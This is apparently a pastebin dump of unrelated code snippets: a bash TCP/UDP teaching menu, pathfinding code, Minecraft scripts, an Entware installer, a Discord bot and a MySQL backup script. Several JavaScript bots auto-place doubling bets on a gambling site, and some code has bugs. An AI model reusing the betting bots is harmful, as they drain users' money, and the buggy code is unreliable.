    echo -e ""\e[1;96m\`\`\`bash""
    echo ""curl -X GET udp://example.com/data""
    echo ""\`\`\`""
    echo ""This initiates a UDP request to obtain data from a server.\e[0m""
}

# Function to explore advanced concepts in TCP and UDP.
function advanced_concepts() {
    echo -e ""\e[1;92mAdvanced Concepts:""
    echo ""1. \e[1;92mWindow Scaling:\e[0m TCP optimizes data transfer over high-latency connections.""
    echo ""2. \e[1;92mSelective Acknowledgments (SACK):\e[0m Enhances TCP's reliability by acknowledging specific data segments.""
    echo ""3. \e[1;92mQuality of Service (QoS):\e[0m UDP can be used with QoS settings to prioritize traffic.""
    echo ""4. \e[1;92mSecurity Measures:\e[0m Explore encryption and authentication in TCP/UDP for enhanced security.""

    read -p ""\e[1;96mEnter the number of the topic you want to explore (1-4): "" choice

    case $choice in
        1)
            echo -e ""\e[1;92mWindow Scaling:\e[0m TCP adapts to different network conditions, improving performance by adjusting the size of the data window.""
            ;;
        2)
            echo -e ""\e[1;92mSelective Acknowledgments (SACK):\e[0m TCP acknowledges specific data segments, reducing retransmissions and optimizing data transfer.""
            ;;
        3)
            echo -e ""\e[1;92mQuality of Service (QoS):\e[0m UDP can prioritize real-time applications over other traffic, ensuring a smoother user experience.""
            ;;
        4)
            echo -e ""\e[1;92mSecurity Measures:\e[0m Implement encryption and authentication for enhanced security in both TCP and UDP communications. This ensures data confidentiality and integrity, crucial in secure communication.""
            ;;
        *)
            echo ""Invalid choice. Returning to the main menu.""
            ;;
    esac
}

# Function to provide real-world examples of TCP and UDP usage.
function real_world_examples() {
    echo -e ""\e[1;92mReal-world Examples:""
    echo ""1. \e[1;92mHTTP - TCP:\e[0m Web browsing uses TCP for reliable data transfer.""
    echo ""2. \e[1;92mDNS - UDP:\e[0m DNS queries use UDP for faster response times.""
    echo ""3. \e[1;92mVideo Streaming - UDP:\e[0m Services like YouTube use UDP for low-latency streaming.""
    echo ""4. \e[1;92mVoIP - UDP:\e[0m Voice over IP relies on UDP for real-time audio communication.""
    echo ""5. \e[1;92mOnline Gaming - UDP:\e[0m Games like Fortnite use UDP for low-latency interactions.""

    read -p ""\e[1;96mEnter the number of the example you want to explore (1-5): "" choice

    case $choice in
        1)
            echo -e ""\e[1;92mHTTP - TCP:\e[0m Web browsers use TCP to ensure reliable delivery of web pages and resources, making it essential for a seamless browsing experience.""
            ;;
        2)
            echo -e ""\e[1;92mDNS - UDP:\e[0m DNS queries use\e[1;92mUDP for quick response times in resolving domain names, facilitating faster internet navigation.""
            ;;
        3)
            echo -e ""\e[1;92mVideo Streaming - UDP:\e[0m Services like YouTube use UDP for low-latency video streaming, prioritizing real-time playback and providing a smooth viewing experience.""
            ;;
        4)
            echo -e ""\e[1;92mVoIP - UDP:\e[0m Voice over IP relies on UDP for real-time audio communication, emphasizing immediacy over perfect quality, ensuring clear and uninterrupted voice communication in applications like Skype or Zoom.""
            ;;
        5)
            echo -e ""\e[1;92mOnline Gaming - UDP:\e[0m Games like Fortnite use UDP for low-latency multiplayer interactions, ensuring responsive gameplay and a more enjoyable gaming experience.""
            ;;
        *)
            echo ""Invalid choice. Returning to the main menu.""
            ;;
    esac
}

# Function to explore various network protocols.
function explore_protocols() {
    echo -e ""\e[1;92mExplore Protocols:""
    echo ""1. \e[1;92mHTTP - Hypertext Transfer Protocol""
    echo ""2. \e[1;92mFTP - File Transfer Protocol""
    echo ""3. \e[1;92mSMTP - Simple Mail Transfer Protocol""
    echo ""4. \e[1;92mSSH - Secure Shell Protocol""
    echo ""5. \e[1;92mSNMP - Simple Network Management Protocol""
    echo ""6. \e[1;92mCustom Protocol - Simulate a custom network protocol for educational purposes.""

    read -p ""\e[1;96mEnter the number of the protocol you want to explore (1-6): "" choice

    case $choice in
        1)
            echo -e ""\e[1;92mHTTP - Hypertext Transfer Protocol:\e[0m The foundation of data communication on the web. It facilitates the transfer of text, images, and multimedia. Used for web browsing and accessing web-based applications.""
            ;;
        2)
            echo -e ""\e[1;92mFTP - File Transfer Protocol:\e[0m Used for transferring files between a server and a client on a network. Commonly employed for website maintenance, file sharing, and software distribution.""
            ;;
        3)
            echo -e ""\e[1;92mSMTP - Simple Mail Transfer Protocol:\e[0m Handles the sending of emails between servers. Essential for electronic communication and email delivery, ensuring reliable email communication.""
            ;;
        4)
            echo -e ""\e[1;92mSSH - Secure Shell Protocol:\e[0m Provides secure access to a remote computer over a network. Widely used for secure command-line access, file transfers, and remote management of systems.""
            ;;
        5)
            echo -e ""\e[1;92mSNMP - Simple Network Management Protocol:\e[0m Used for managing and monitoring network devices. Enables administrators to monitor and control network resources, ensuring optimal network performance.""
            ;;
        6)
            echo -e ""\e[1;92mCustom Protocol - Simulate a Custom Network Protocol:\e[0m Simulate the creation and behavior of a custom network protocol for educational purposes. Understand the process of designing and implementing a protocol.""
            ;;
        *)
            echo ""Invalid choice. Returning to the main menu.""
            ;;
    esac
}

# Function to update the educational tool.
function update_tool() {
    echo -e ""\e[1;92mUpdating EHONWA - TCP and UDP Educational Tool...\e[0m""
    # Add update logic here
    echo -e ""\e[1;92mEHONWA updated successfully!\e[0m""
}

# Function to provide additional learning resources.
function additional_resources() {
    echo -e ""\e[1;92mAdditional Learning Resources:""
    echo ""1. \e[1;96mTCP/IP Illustrated, Volume 1: The Protocols by W. Richard Stevens""
    echo ""2. \e[1;96mComputer Networking: Principles, Protocols and Practice by Olivier Bonaventure""
    echo ""3. \e[1;96mNetwork Warrior: Everything You Need to Know That Wasn't on the CCNA Exam by Gary A. Donahue""
    echo ""4. \e[1;96mWireshark Network Analysis by Laura Chappell""
    echo ""5. \e[1;96mRFC (Request for Comments) documents for in-depth protocol specifications.""

    read -p ""\e[1;96mEnter the number of the resource you want to explore or 'back' to return to the main menu: "" choice

    case $choice in
        1)
            echo -e ""\e[1;92mTCP/IP Illustrated, Volume 1: The Protocols by W. Richard Stevens:\e[0m A comprehensive guide providing a detailed understanding of TCP/IP protocols with clear illustrations and examples.""
            ;;
        2)
            echo -e ""\e[1;92mComputer Networking: Principles, Protocols and Practice by Olivier Bonaventure:\e[0m A textbook covering the principles of computer networking, including protocols like TCP and UDP.""
            ;;
        3)
            echo -e ""\e[1;92mNetwork Warrior: Everything You Need to Know That Wasn't on the CCNA Exam by Gary A. Donahue:\e[0m Practical insights into network administration, with real-world scenarios and tips for managing networks effectively.""
            ;;
        4)
            echo -e ""\e[1;92mWireshark Network Analysis by Laura Chappell:\e[0m A guide to using Wireshark for network analysis, helping you understand and troubleshoot network protocols.""
            ;;
        5)
            echo -e ""\e[1;92mRFC (Request for Comments) documents:\e[0m Explore the official specifications for TCP, UDP, and other network protocols. These documents provide in-depth details about protocol standards and implementations.""
            ;;
        ""back"")
            echo ""Returning to the main menu.""
            ;;
        *)
            echo ""Invalid choice. Returning to the main menu.""
            ;;
    esac
}

# Function to generate network traffic for simulation purposes.
function generate_network_traffic() {
    echo -e ""\e[1;92mGenerating Network Traffic...\e[0m""
    # Add logic to generate network traffic (e.g., using tools like iperf)
    echo -e ""\e[1;92mNetwork traffic generated successfully!\e[0m""
}

# Function to simulate network issues for testing.
function simulate_network_issues() {
    echo -e ""\e[1;92mSimulating Network Issues...\e[0m""
    # Add logic to simulate network issues (e.g., using tools like tc)
    echo -e ""\e[1;92mNetwork issues simulated successfully!\e[0m""
}

# Function to exit the educational tool.
function exit_tool() {
    echo -e ""\e[1;91mExiting EHONWA - TCP and UDP Educational Tool. Goodbye!\e[0m""
    exit 0
}

# Function to handle invalid choices.
function handle_invalid
# Function to handle invalid choices.
function handle_invalid_choice() {
    echo -e ""\e[1;91mInvalid choice. Please enter a valid option.\e[0m""
}

# Function to handle errors with a provided error message.
function handle_error() {
    local error_message=""$1""
    echo -e ""\e[1;91mError: $error_message\e[0m""
    echo -e ""\e[1;91mPlease review the information provided and try again.\e[0m""
}

# Function to display the graphical user interface.
function display_gui() {
    clear
    echo -e ""\e[1;92m-----------------------------------------------------------""
    echo -e ""| \e[1;92mEHONWA - TCP and UDP Educational Resource Tool \e[1;92m|""
    echo -e ""-----------------------------------------------------------\e[0m""
    display_menu
}

# Main loop to interact with the user.
while true; do
    display_gui

    read -p ""\e[1;96mEnter your choice: "" choice

    case $choice in
        1) learn_tcp_basics ;;
        2) learn_udp_basics ;;
        3) advanced_concepts ;;
        4) real_world_examples ;;
        5) explore_protocols ;;
        6) update_tool ;;
        7) additional_resources ;;
        8) generate_network_traffic ;;
        9) simulate_network_issues ;;
        10 | ""exit"") exit_tool ;;
        *) handle_invalid_choice ;;
    esac
done
"
Dtqfhnd3,Dijkstra and A star compared,jabela,Python,Sunday 24th of December 2023 01:02:25 AM CDT,"import heapq

def reconstruct_path(came_from, current):
    """"""Reconstruct the path from start to current node.""""""
    path = []
    while current in came_from:
        path.append(current)
        current = came_from[current]
    return path[::-1]

def dijkstra(grid, start, end):
    """"""Dijkstra's algorithm to find the shortest path in a grid.""""""
    rows, cols = len(grid), len(grid[0])
    visited = set()
    came_from = {}
    queue = [(0, start)]
    explored_nodes = []

    while queue:
        current_dist, current = heapq.heappop(queue)
        if current in visited:
            continue
        visited.add(current)
        came_from[current] = None if current == start else prev
        explored_nodes.append(current)

        if current == end:
            return current_dist, reconstruct_path(came_from, current), explored_nodes

        for dx, dy in [(-1, 0), (1, 0), (0, -1), (0, 1)]:
            x, y = current[0] + dx, current[1] + dy
            prev = current
            if 0 <= x < rows and 0 <= y < cols and grid[x][y] == 0 and (x, y) not in visited:
                heapq.heappush(queue, (current_dist + 1, (x, y)))

    return -1, [], explored_nodes

def manhattan_distance(start, end):
    """"""Calculate the Manhattan distance between two points.""""""
    return abs(start[0] - end[0]) + abs(start[1] - end[1])

def a_star(grid, start, end):
    """"""A* algorithm to find the shortest path in a grid.""""""
    rows, cols = len(grid), len(grid[0])
    visited = set()
    came_from = {}
    queue = [(manhattan_distance(start, end), 0, start)]
    explored_nodes = []

    while queue:
        total_cost, current_dist, current = heapq.heappop(queue)
        if current in visited:
            continue
        visited.add(current)
        came_from[current] = None if current == start else prev
        explored_nodes.append(current)

        if current == end:
            return current_dist, reconstruct_path(came_from, current), explored_nodes

        for dx, dy in [(-1, 0), (1, 0), (0, -1), (0, 1)]:
            x, y = current[0] + dx, current[1] + dy
            prev = current
            if 0 <= x < rows and 0 <= y < cols and grid[x][y] == 0 and (x, y) not in visited:
                heapq.heappush(queue, (current_dist + 1 + manhattan_distance((x, y), end), current_dist + 1, (x, y)))

    return -1, [], explored_nodes

# Example grid and start/end points
grid = [
    [0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
    [0, 1, 1, 1, 1, 0, 1, 1, 1, 0],
    [0, 1, 0, 0, 0, 0, 1, 0, 0, 0],
    [0, 1, 0, 1, 1, 1, 1, 0, 1, 0],
    [0, 0, 0, 0, 0, 0, 0, 0, 1, 0],
    [0, 1, 1, 1, 1, 1, 1, 0, 1, 0],
    [0, 1, 0, 0, 0, 0, 0, 0, 1, 0],
    [0, 1, 0, 1, 1, 1, 1, 0, 1, 0],
    [0, 1, 0, 1, 0, 0, 0, 0, 1, 0],
    [0, 0, 0, 0, 0, 1, 1, 1, 1, 0]
]
start = (0, 0)
end = (9, 9)

# Run both algorithms
dijkstra_result, dijkstra_path, dijkstra_explored = dijkstra(grid, start, end)
a_star_result, a_star_path, a_star_explored = a_star(grid, start, end)

print(f""Dijkstra: Path length = {dijkstra_result}"")
print(f""A*      : Path length = {a_star_result}"")

print(f""Dijkstra: Nodes explored = {len(dijkstra_explored)} Explored: {dijkstra_explored}"")
print(f""A*      : Nodes explored = {len(a_star_explored)} Explored: {a_star_explored} "")"
JPDYSufX,Fontania Bahnübergang PC,MagmaLP,Lua,Sunday 24th of December 2023 12:58:36 AM CDT,"function Pistons()
    rs.setOutput(""top"", true)
    sleep(10)
	rs.setOutput(""top"", false)
end

function BellsAndLamps()
    for i = 1,10 do
        rs.setOutput(""left"", true)
        rs.setOutput(""right"", true)
        sleep(0.5)
        rs.setOutput(""left"", false)
        rs.setOutput(""right"", false) 
        sleep(0.5)
    end
end
    
if rs.getInput(""front"", true) then
    Pistons()"
6F6tgMfQ,snowybot experienced,coinwalk,JavaScript,Sunday 24th of December 2023 12:23:17 AM CDT,"var oldestbal = parseFloat(document.getElementById('pct_balance').value);
var base = (oldestbal/100);
var bellance = oldestbal;
var botplus = base;
var trget = oldestbal;
var tens = (base*10);
var sevens = (base*6.9);
var eights  = (base*7.1)
var floatingbal = 0;
var betnext = ((botplus*1).toFixed(8));

 
function get(){
bellance = document.getElementById('pct_balance').value;
if ((bellance>(((Math.floor(bellance/tens))*tens)+sevens))&&(bellance<(((Math.floor(bellance/tens))*tens)+eights))&&(bellance!=floatingbal)) {
     botplus = botplus*2;    
     floatingbal  = parseFloat(bellance);
}
if ((bellance<=(botplus*20))&&(bellance>(((Math.floor(bellance/tens))*tens)+sevens))&&(bellance<(((Math.floor(bellance/tens))*tens)+eights))){
    botplus = base*2;
     floatingbal  = parseFloat(bellance);
}
if ((oldestbal<=(botplus*20))&&(bellance>(((Math.floor(bellance/tens))*tens)+sevens))&&(bellance<(((Math.floor(bellance/tens))*tens)+eights))){
    botplus = base*2;
     floatingbal  = parseFloat(bellance);
}
if ((bellance<=(botplus*20))&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))){
    botplus = base;
    floatingbal = 0;
}
if ((oldestbal<=(botplus*20))&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))){
    botplus = base;
    floatingbal = 0;
}
if (bellance>=(trget*24)){
console.log(""winner winner chicken dinner""); 
  return;
}
betnext = ((botplus*1).toFixed(8));
$('#pct_chance').val(49.5);
$('#pct_bet').val(betnext);
$('#a_hi').click();
setTimeout(() => get(), 1);
}
get();"
WvbZAKKb,Angelheart vials,abc123mewot,Lua,Saturday 23rd of December 2023 11:56:23 PM CDT,"print(""Angelheart vial autocrafting turtle"")

-- ME Interface must be placed in front of the turtle

if not fs.exists(""utils.lua"") then
	print(""Downloading Botany Base Utils API"")
	shell.run(""pastebin get zBLN8K4d utils.lua"")
end
os.loadAPI(""utils.lua"")

utils.setSignalItem(""minecraft:cobblestone"")

local expectingRune = false

while true do
	if utils.scanForItem(""botania:livingrock"") then
		print(""Crafting an angelheart vial"")
		os.sleep(1) -- Wait for the turtle to get all the items from the interface
		utils.dropDownAllItems() -- Drop all items on runic alter
		os.sleep(3) -- Give it some time to craft
		expectingRune = true
	end
	
	if utils.scanForItem(""xreliquary:angelheart_vial"") then
		if expectingRune then print(""Angelheart vial was crafted"") else print(""Got unexpected angelheart vial!"") end
		utils.dropAllItems(true) -- Also drop the signal item
		expectingRune = false
		os.sleep(0.1)
	end
	
	if not expectingRune then -- If a rune is expected to craft then constantly check for it
		if utils.isServerRestartingSoon() then
			break -- Stop crafting if the servers going to restart
		end
		os.sleep(1)
	end
end
"
EdyajRZi,# tk_rgb_jelly.py,here2share,Python,Saturday 23rd of December 2023 11:38:53 PM CDT,"# tk_rgb_jelly.py

import tkinter as tk
from PIL import Image, ImageTk, ImageFilter, ImageDraw
import math
import random

ww = 500
hh = 500

blank_image = Image.new(""RGBA"", (ww, hh), ""black"")
draw = ImageDraw.Draw(blank_image)

colors = ['#%02X%02X%02X'%(r,g,b) for r in range(0, 256, 15) for g in range(0, 256, 15) for b in range(0, 256, 15)]
random.shuffle(colors)
Lc = len(colors)
print(Lc)

def blur_canvas(radius):
	image = blank_image.filter(ImageFilter.GaussianBlur(radius))
	image = image.point(lambda x: x // 30 * 30)
	photo = ImageTk.PhotoImage(image)
	canvas.create_image(0, 0, anchor=tk.NW, image=photo)
	canvas.image = photo

def rotate_polygon(polygon, angle_degrees):
	angle_radians = math.radians(angle_degrees)
	centroid_x, centroid_y = 0, 0
	for x, y in polygon:
		centroid_x += x
		centroid_y += y

	centroid_x /= len(polygon)
	centroid_y /= len(polygon)

	translated_coords = [(x - centroid_x, y - centroid_y) for x, y in polygon]

	rotated_coords = []
	for x, y in translated_coords:
		new_x = x * math.cos(angle_radians) - y * math.sin(angle_radians)
		new_y = x * math.sin(angle_radians) + y * math.cos(angle_radians)
		rotated_coords.append((new_x, new_y))

	final_coords = [(coord[0] + centroid_x, coord[1] + centroid_y) for coord in rotated_coords]

	return final_coords

all_triangles = []
def draw_triangles(size):
	height = size * math.sqrt(3) / 2
	row = 0
	while row * height < ww:
		half_offset_x = -2 if row % 2 else size // 2 - 2
		col = -1
		while col * size < hh + size * 2:
			x0 = (col - 1) * size - 2 - half_offset_x
			y0 = row * height
			x1 = x0 + size
			y1 = y0 + height
			triangle = [
				(x0, y0), (x1, y0), (x1 - size / 2, y1)
			]
			rotated_triangle = rotate_polygon(triangle, 180)
			rotated_triangle = [(coord[0] + size // 2, coord[1] + size * 0.3) for coord in rotated_triangle]

			all_triangles.append(triangle) ###
			all_triangles.append(rotated_triangle)
			col += 1
		row += 1
	change_triangle_colors(0)

def change_triangle_colors(event):
	random.shuffle(colors)
	color_index = 0
	for filled_triangle in all_triangles:
		draw.polygon(filled_triangle, outline='black', fill=colors[color_index])
		color_index = (color_index + 1) % Lc
	blur_canvas(16)

root = tk.Tk()
root.title(""tk_rgb_jelly"")

canvas = tk.Canvas(root, width=ww, height=hh, bg='black')
canvas.pack()

root.bind(""<space>"", change_triangle_colors)

triangle_size = 50
draw_triangles(triangle_size)

root.mainloop()"
1cZzHNZs,opkg.conf,Mayk718,Bash,Saturday 23rd of December 2023 11:33:28 PM CDT,"src/gz entware http://bin.entware.net/armv7sf-k3.2
dest root /
dest ram /jffs/tmp
lists_dir ext /jffs/var/opkg-lists
option tmp_dir /jffs/tmp
arch all 100
arch armv7-3.2 160"
Fmbdhtsh,generic,Mayk718,Bash,Saturday 23rd of December 2023 11:25:21 PM CDT,"#!/bin/sh

TYPE='generic'
#TYPE='alternative'

#|---------|-----------------------|---------------|---------------|---------------------|-------------------|-------------------|----------------------|-------------------|
#| ARCH    | aarch64-k3.10         | armv5sf-k3.2  | armv7sf-k2.6  | armv7sf-k3.2        | mipselsf-k3.4     | mipssf-k3.4       | x64-k3.2             | x86-k2.6          |
#| LOADER  | ld-linux-aarch64.so.1 | ld-linux.so.3 | ld-linux.so.3 | ld-linux.so.3       | ld.so.1           | ld.so.1           | ld-linux-x86-64.so.2 | ld-linux.so.2     |
#| GLIBC   | 2.27                  | 2.27          | 2.23          | 2.27                | 2.27              | 2.27              | 2.27                 | 2.23              |
#|---------|-----------------------|---------------|---------------|---------------------|-------------------|-------------------|----------------------|-------------------|

unset LD_LIBRARY_PATH
unset LD_PRELOAD

ARCH=armv7sf-k3.2
LOADER=ld-linux.so.3
GLIBC=2.27

echo 'Info: Checking for prerequisites and creating folders...'
if [ -d /jffs ]; then
    echo 'Warning: Folder /jffs exists!'
else
    mkdir /jffs
fi
# no need to create many folders. entware-opt package creates most
for folder in bin etc lib/opkg tmp var/lock
do
  if [ -d ""/jffs/$folder"" ]; then
    echo ""Warning: Folder /jffs/$folder exists!""
    echo 'Warning: If something goes wrong please clean /jffs folder and try again.'
  else
    mkdir -p /jffs/$folder
  fi
done

echo 'Info: Opkg package manager deployment...'
URL=http://bin.entware.net/${ARCH}/installer
wget $URL/opkg -O /jffs/bin/opkg
chmod 755 /jffs/bin/opkg
wget $URL/opkg.conf -O /jffs/etc/opkg.conf

echo 'Info: Basic packages installation...'
/jffs/bin/opkg update
if [ $TYPE = 'alternative' ]; then
  /jffs/bin/opkg install busybox
fi
/jffs/bin/opkg install entware-opt

# Fix for multiuser environment
chmod 777 /jffs/tmp

for file in passwd group shells shadow gshadow; do
  if [ $TYPE = 'generic' ]; then
    if [ -f /etc/$file ]; then
      ln -sf /etc/$file /jffs/etc/$file
    else
      [ -f /jffs/etc/$file.1 ] && cp /jffs/etc/$file.1 /jffs/etc/$file
    fi
  else
    if [ -f /jffs/etc/$file.1 ]; then
      cp /jffs/etc/$file.1 /jffs/etc/$file
    fi
  fi
done

[ -f /etc/localtime ] && ln -sf /etc/localtime /jffs/etc/localtime

echo 'Info: Congratulations!'
echo 'Info: If there are no errors above then Entware was successfully initialized.'
echo 'Info: Add /jffs/bin & /jffs/sbin to $PATH variable'
echo 'Info: Add ""/jffs/etc/init.d/rc.unslung start"" to startup script for Entware services to start'
if [ $TYPE = 'alternative' ]; then
  echo 'Info: Use ssh server from Entware for better compatibility.'
fi
echo 'Info: Found a Bug? Please report at https://github.com/Entware/Entware/issues'"
WH0mJpuE,snowybot awesome,coinwalk,JavaScript,Saturday 23rd of December 2023 11:17:53 PM CDT,"var kozster = parseFloat(document.getElementById('pct_balance').value);
var beast = (kozster/100);
var burgzie = kozster;
var zeggar = beast;
var trget = kozster;
var tens = (beast*10);
var sevens = (beast*6.9);
var eights  = (beast*7.1)
var fran = 0;
var awesome = 80000;
var toot = ((zeggar*1).toFixed(8));
var bull = document.getElementById('pct_balance').value;
var noddy = parseFloat(document.getElementById('pct_balance').value);
 
function get(){
burgzie = document.getElementById('pct_balance').value;
if (((burgzie/20)>zeggar)&&((kozster/20)>zeggar)&&(burgzie>(((Math.floor(burgzie/tens))*tens)+sevens))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+eights))&&(burgzie!=fran)) {
     zeggar = zeggar*2;    
     fran  = parseFloat(burgzie);
}
if (((burgzie/20)<=zeggar)&&((kozster/20)<=zeggar)&&(burgzie>(((Math.floor(burgzie/tens))*tens)+sevens))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+eights))) {
    zeggar = beast*2;
    fran = parseFloat(burgzie);
}
if (((burgzie/20)<=zeggar)&&((kozster/20)<=zeggar)&&(burgzie<(((Math.floor(burgzie/tens))*tens)+sevens))) {
    zeggar = beast;
    fran = 0;
}
if (burgzie>=(trget*24)){
console.log(""winner winner chicken dinner""); 
  return;
}
if (burgzie<=(beast*20)){
console(""lost sadly"");
return;
}
toot = ((zeggar*1).toFixed(8));
$('#pct_chance').val(49.5);
$('#pct_bet').val(toot);
$('#a_hi').click();
setTimeout(() => get(), 1);
}
get();"
nkV4Pwbt,LC 329. Longest Increasing Path in a Matrix,bennyfromtheblock,Python,Saturday 23rd of December 2023 10:53:12 PM CDT,"'''
329. Longest Increasing Path in a Matrix

Key Idea: We don't know which coordinate to start at, so we need to try all of them. We can cache the result for each coordinate so we don't need to repeat ourselves. Since the rules say we need to look for INCREASING paths, we don't need to use a visited set for backtracking because a monotonically increasing traversal will never have a cycle. No cycles -> DAG structure, can use memoization. 

TC: O(MN)
SC: O(MN)
'''

DIRS = [
    (1, 0), (0, 1), (-1, 0), (0, -1)
]

class Solution:
    def longestIncreasingPath(self, matrix: List[List[int]]) -> int:
        if not matrix:
            return 0

        M, N = len(matrix), len(matrix[0])
        cache = [[0] * N for _ in range(M)]
        #visited = set()

        def dfs(row, col) -> int:
            if cache[row][col] > 0:
                return cache[row][col]

            longest_neighbor = 0
            for dy, dx in DIRS:
                new_row = row + dy
                new_col = col + dx
                # if (new_row, new_col) in visited:
                #     continue
                if new_row < 0 or new_row >= M or new_col < 0 or new_col >= N:
                    continue                
                if matrix[new_row][new_col] <= matrix[row][col]:
                    continue
                #visited.add((new_row, new_col))
                longest_neighbor = max(longest_neighbor, dfs(new_row, new_col))
                #visited.remove((new_row, new_col))
                
            cache[row][col] = 1 + longest_neighbor

            return cache[row][col]


        max_len = 0

        for row in range(M):
            for col in range(N):
                max_len = max(max_len, dfs(row, col))

        return max_len"
50QLGHQU,كود تحزيرات,Mahmouood,JavaScript,Saturday 23rd of December 2023 10:49:47 PM CDT,"let id = ""ايدي شات الي هتنرسل في التحزيرات""
client.on(""messageCreate"", async (message) => {
  if (message.content === prefix+""send"") {
    if (!message.member.permissions.has(Discord.PermissionsBitField.Flags.Administrator)) return;
    let row = new Discord.ActionRowBuilder()
      .addComponents(
        new Discord.ButtonBuilder()
          .setCustomId(""warn"")
          .setStyle(Discord.ButtonStyle.Secondary)
          .setLabel(""تحزير"")
      )
      message.channel.send({content:""اضغط لتحزير شخص"", components: [row] });
  }
});

client.on(""interactionCreate"", async (interaction) => {
  if (!interaction.isButton()) return;
  if (interaction.customId === ""warn"") {
    if (!interaction.member.permissions.has(Discord.PermissionsBitField.Flags.Administrator)) return interaction.reply({ content: ""تحتاج صلحيات لفعل هذا"", ephemeral: true });
    const modal = new Discord.ModalBuilder()
    .setCustomId('Main')
    .setTitle(`نظام تحزيرات البائعين`)
     let mm =  new Discord.TextInputBuilder()
        .setCustomId('1')
        .setLabel(`ايدي الشخص :`)
        .setStyle(Discord.TextInputStyle.Short)
        .setMinLength(1)
        .setMaxLength(100)
        .setPlaceholder(`ضع ايدي الشخص هنا`)
        .setRequired(true)
        let ss = new Discord.TextInputBuilder()
        .setCustomId('2')
        .setLabel(`سبب التحزير :`)
        .setStyle(Discord.TextInputStyle.Paragraph)
        .setMinLength(1)
        .setMaxLength(200)
        .setPlaceholder(`ضع سبب التحزير هنا`)
        .setRequired(true)
        let rr = new Discord.TextInputBuilder()
        .setCustomId('3')
        .setLabel(`دليل التحزير :`)
        .setStyle(Discord.TextInputStyle.Paragraph)
        .setMinLength(1)
        .setMaxLength(500)
        .setPlaceholder(`ضع دليل التحزير هنا قم بوضع رابط الصوره اذا كان صوره`)
        .setRequired(true)
        const num1 = new Discord.ActionRowBuilder().addComponents(mm);
        const num2 = new Discord.ActionRowBuilder().addComponents(ss);
        const num3 = new Discord.ActionRowBuilder().addComponents(rr);
        modal.addComponents(num1,num2,num3);
    interaction.showModal(modal)
  }
})

client.on('interactionCreate', async (modal) => {
  if (modal.customId === 'Main') {
    const mm = modal.fields.getTextInputValue('1')
    const ss = modal.fields.getTextInputValue('2')
    const rr = modal.fields.getTextInputValue('3')
    let embed = new Discord.EmbedBuilder()
    .setColor(""Red"")
    .setTimestamp()
    .setThumbnail(modal.guild.iconURL({dynamic: true}))
    .setAuthor({name: `${modal.guild.name}`, iconURL: `${modal.guild.iconURL({dynamic: true})}`})
    .addFields(
    {name: `تم تحزيره للمستخدم :`,value:`<@${mm}>`,inline: false},
    {name: `بسبب :`,value:`${ss}`,inline: false},
    {name: `ودليل التحزير :`,value: `${rr}`,inline: false},
    {name: `تم تحزير بواسطه :`, value: `${modal.user}`, inline: true},
    )
    client.channels.cache.get(id).send({embeds:[embed]})
    modal.reply({content:""تم تحزير الشخص بنجاح"", ephemeral: true })
  }
})"
hfcG6Tsd,db_backup.py,DrAungWinHtut,Python,Saturday 23rd of December 2023 10:45:29 PM CDT,"import subprocess
import time

def backup_database():
    # Replace with your MySQL connection details
    mysql_username = 'root'
    mysql_password = ''
    database_name = 'schooldb'
    
    # Replace with the desired file path for the backup
    backup_file_path = ""e:\\cs2024\\schooldb.sql""

    # Build the mysqldump command
    mysqldump_cmd = f""mysqldump -u {mysql_username} -p{mysql_password} {database_name} > {backup_file_path}""

    # Execute the mysqldump command
    subprocess.run(mysqldump_cmd, shell=True)
    

def restore_database():
    # Replace with your MySQL connection details
    mysql_username = 'root'
    mysql_password = ''
    database_name = 'test'
    
    # Replace with the file path of the backup to restore
    backup_file_path = ""e:\\cs2024\\schooldb.sql""

    # Build the mysql command for restoring
    mysql_cmd = f""mysql -u {mysql_username} -p{mysql_password} {database_name} < {backup_file_path}""

    # Execute the mysql command for restoring
    subprocess.run(mysql_cmd, shell=True)

# Run the backup and restore process every 20 minutes

try:
    restore_database()
except Exception as e:
    print(f""An error occurred: {e}"")
"
VYhX7NpF,AdvancementJS,YTMango,JavaScript,Saturday 23rd of December 2023 09:53:29 PM CDT,"ServerEvents.advancements((event) => {
  let root = event
    .create(id)
    .display((displayInfo) => {
      displayInfo
        .announceToChat(Boolean) // default: false
        .background(backgroundPath) // default: minecraft:textures/gui/advancements/backgrounds/stone.png
        .description() // default: empty array
        .frame(frameType) // default: task
        .hidden(Boolean) // default: false
        .icon(icon) // default: minecraft:apple
        .showToast(Boolean) // default: true
        .title(text); // default: generate from id (underscores to spaces, capitalize first letter)
    })
    .criteria((criterionInfo) => {
      criterionInfo.addCriterion(
        name,
        event.TRIGGER.inventoryChange([""minecraft:apple""])
      );
    })
    .requirements((requirementsInfo) => {
      requirementsInfo.add(""minecraft:apple"");
    })
    .rewards((rewardsInfo) => {
      rewardsInfo.addExperience(10);
    })
    .sendsTelemetryEvent(Boolean); // default: false;

  let child_1 = root.addChild((childInfo) => {
    childInfo.display((displayInfo) => {
      displayInfo
        .announceToChat(Boolean) // default: false
        .description() // default: empty array
        .frame(frameType) // default: task
        .hidden(Boolean) // default: false
        .icon(icon) // default: minecraft:apple
        .showToast(Boolean) // default: true
        .title(text); // default: generate from id (underscores to spaces, capitalize first letter)
    });
  });

  let child_2 = child_1.addChild((childInfo) => {
    childInfo
      .display((displayInfo) => {})
      .criteria((criterionInfo) => {})
      .requirements((requirementsInfo) => {})
      .rewards((rewardsInfo) => {})
      .sendsTelemetryEvent(true);
  });
});"
Q1w825H7,snowzybot,coinwalk,JavaScript,Saturday 23rd of December 2023 09:44:19 PM CDT,"var kozster = parseFloat(document.getElementById('pct_balance').value);
var beast = ((kozster/10).toFixed(8));
var burgzie = kozster;
var zeggar = beast;
var trget = kozster;
var tens = (beast*10);
var sevens = (beast*6.9);
var eights  = (beast*7.1)
var fran = 0;
var skittle = kozster;
var toot = ((zeggar*1).toFixed(8));
 
function get(){
burgzie = document.getElementById('pct_balance').value;
if ((burgzie>(zeggar+zeggar))&&(skittle>(zeggar+zeggar))&&(burgzie>(((Math.floor(burgzie/tens))*tens)+sevens))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+eights))&&(burgzie!=fran)) {
     zeggar = zeggar*2;    
     fran  = parseFloat(burgzie);
}
